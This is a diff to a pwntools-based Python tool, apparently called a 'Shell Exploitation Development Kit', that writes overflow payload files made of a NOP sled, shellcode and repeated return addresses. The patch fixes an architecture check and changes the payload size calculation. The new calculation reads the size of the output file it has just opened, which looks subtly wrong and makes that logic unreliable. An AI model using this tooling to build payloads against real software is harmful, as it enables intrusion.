@@ -2,6 +2,7 @@ from pwnlib import *
 from pwn import *
 import argparse
 import struct
+import os
 import sys
 
 os_types = ["linux", "windows", "freebsd", "bsd", "BSD", "Linux"]
@@ -37,8 +38,8 @@ class GenerateShellcode:
             raise SXDK("Input into operating_system is wrong.")
         context.os = self.shell_os.lower()
         self.shell_os = self.shell_os.lower()
-        #if self.architecture != 32 or self.architecture != 64:
-        #    raise SXDK("Input into architecture is wrong.")
+        if self.architecture != 32 and self.architecture != 64:
+            raise SXDK("Input into architecture is wrong.")
         context.bits = self.architecture
         if "little" in self.endianness or "big" in self.endianness:
             context.endian = self.endianness
@@ -55,12 +56,13 @@ class GenerateShellcode:
         e = open(shells[self.instruction_set.lower()], "r")
         f = open(name, "w")
         shell_data = e.read()
-        b = b - sys.getsizeof(shell_data)
+        c= os.path.getsize(name)
+        b = b - c
         total_nop = b // (sys.getsizeof(asm('nop'))//4)
 
         f.write("{0}{1}{2}".format(asm('nop')*total_nop, shell_data, struct.pack(endian_flag,self.starting_address)*self.num_of_addresses))
-        #f.close()
 
+        #f.close()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Shell Exploitation Development Kit")
